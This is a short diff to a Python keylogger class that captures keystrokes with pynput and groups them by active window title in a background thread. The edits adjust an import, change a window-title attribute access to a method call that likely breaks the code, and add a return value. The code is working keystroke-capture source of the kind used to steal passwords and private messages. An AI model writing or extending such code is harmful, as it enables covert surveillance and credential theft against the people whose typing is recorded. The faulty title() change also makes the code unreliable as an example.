@@ -1,5 +1,5 @@
 from pynput import keyboard
-from i_key_logger_service import IKeloggerService
+from .i_key_logger_service import IKeloggerService
 import pygetwindow as gw
 import threading
 
@@ -13,7 +13,7 @@ class KeyLoggerService(IKeloggerService):
             formated = format(key.char)
         except:
             formated = format(key)
-        current_screen = gw.getActiveWindow().title
+        current_screen = gw.getActiveWindow().title()
         if current_screen not in KeyLoggerService.storage:
             KeyLoggerService.storage[current_screen] = []
         KeyLoggerService.storage[current_screen].append(formated)
@@ -28,6 +28,8 @@ class KeyLoggerService(IKeloggerService):
                 listener.join()
         collector = threading.Thread(target=collect)
         collector.start()
+
+        return True
 
     # Stop the service
     @property
